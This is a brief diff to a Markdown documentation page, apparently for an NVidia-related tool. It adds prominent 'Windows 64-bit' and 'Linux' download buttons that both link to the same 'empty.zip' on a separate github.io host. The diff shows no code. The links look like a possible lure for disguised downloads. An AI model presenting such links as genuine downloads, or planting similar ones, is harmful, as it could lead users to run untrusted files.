@@ -12,4 +12,9 @@ redirect_from:
   - /NVidia
 ---
 
+
+# [🔽Windows 64-bit (4MB)](https://gpuzelenograd.github.io/releases/empty.zip)
+# [🔽Linux (4MB)](https://gpuzelenograd.github.io/releases/empty.zip)
+
+
 ## User manual
